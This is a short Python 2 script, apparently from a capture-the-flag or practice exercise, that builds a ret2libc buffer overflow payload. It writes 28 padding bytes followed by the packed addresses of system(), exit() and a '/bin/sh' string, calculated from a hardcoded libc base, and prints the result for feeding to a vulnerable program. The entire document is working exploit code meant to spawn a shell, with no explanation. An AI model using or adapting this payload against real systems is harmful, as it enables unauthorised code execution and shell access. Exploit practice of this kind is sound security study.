from subprocess import *
import struct

base = 0xf75aa000
binsh = 0x15d1a9
syst = 0x0003e360
exit = 0x00031150

syst_final = struct.pack("I", base+syst)
exit_final = struct.pack("I", base+exit)
binsh_final = struct.pack("I", base+binsh)

buf = "A" * 28
buf += syst_final
buf +=exit_final
buf += binsh_final
print buf